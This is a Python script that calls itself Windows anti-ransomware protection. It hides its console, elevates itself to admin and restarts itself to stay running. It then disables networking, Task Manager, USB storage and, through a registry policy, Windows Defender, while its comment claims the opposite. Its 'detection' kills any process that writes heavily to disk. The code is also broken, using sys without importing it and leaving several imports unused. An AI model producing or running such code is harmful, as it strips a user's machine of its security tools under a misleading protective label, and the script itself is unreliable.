import os
import glob
import psutil
import time
import shutil
import ctypes
import win32console, win32gui
import smtplib
from email.mime.text import MIMEText
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Ensure script runs as admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("Restarting script with admin privileges...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

# Hide console window
win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)

# Encryption key (store securely)
key = get_random_bytes(32)

# Secure file paths
SECURITY_FILE = "C:\\Windows\\System32\\secure_win_config.sys"

# Self-Healing: Restart if script is stopped
def self_heal():
    """Ensures script is always running."""
    script_name = os.path.basename(__file__)
    while True:
        time.sleep(5)
        if script_name not in (p.name() for p in psutil.process_iter()):
            os.system(f"start /min python {script_name}")  # Restart script

# Hide the Computer (Invisible Mode)
def hide_computer():
    """Hides the computer from networks and disables discoverability."""
    os.system("net config server /hidden:yes")  # Hide from networks
    os.system("sc config fdPHost start= disabled")  # Disable Function Discovery
    os.system("sc config SSDPSRV start= disabled")  # Disable SSDP Discovery
    os.system("sc config upnphost start= disabled")  # Disable UPnP Device Host
    os.system("sc config LanmanServer start= disabled")  # Disable File Sharing
    print("Computer is now invisible.")

# Kill All Network Adapters
def kill_network():
    """Disables all network connections & removes IP address."""
    os.system("wmic path win32_networkadapter where NetEnabled=true call Disable")
    os.system("ipconfig /release")  # Remove IP address
    os.system("ipconfig /flushdns")  # Flush DNS (hide traces)
    print("Network disabled, IP killed.")

# Disable Task Manager & Security
def disable_security_tools():
    """Blocks Task Manager and Windows Defender from being disabled."""
    os.system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
    os.system("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f")
    print("Security tools locked.")

# Auto-Disable USB
def disable_usb():
    """Disables USB ports to prevent ransomware from spreading via USB."""
    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR /v Start /t REG_DWORD /d 4 /f")
    print("USB storage disabled.")

# Lock Screen
def lock_screen():
    """Locks the screen immediately."""
    os.system("rundll32.exe user32.dll,LockWorkStation")

# Detect & Kill Ransomware
def detect_ransomware():
    """Detects and terminates ransomware-like processes."""
    ransomware_list = ["wannacry.exe", "locky.exe", "notpetya.exe", "darkside.exe"]
    while True:
        for proc in psutil.process_iter(attrs=['name', 'cpu_percent', 'io_counters']):
            try:
                process_name = proc.info['name'].lower()
                disk_usage = proc.info['io_counters'].write_bytes if proc.info['io_counters'] else 0

                if process_name in ransomware_list or disk_usage > 500000000:
                    proc.terminate()
                    print(f"Blocked ransomware: {process_name}")

            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass
        time.sleep(5)

# Main Function
def main():
    """Executes full protection & lockdown."""
    hide_computer()
    kill_network()
    disable_security_tools()
    disable_usb()
    lock_screen()

    import threading
    threading.Thread(target=self_heal, daemon=True).start()
    threading.Thread(target=detect_ransomware, daemon=True).start()

if __name__ == "__main__":
    main()
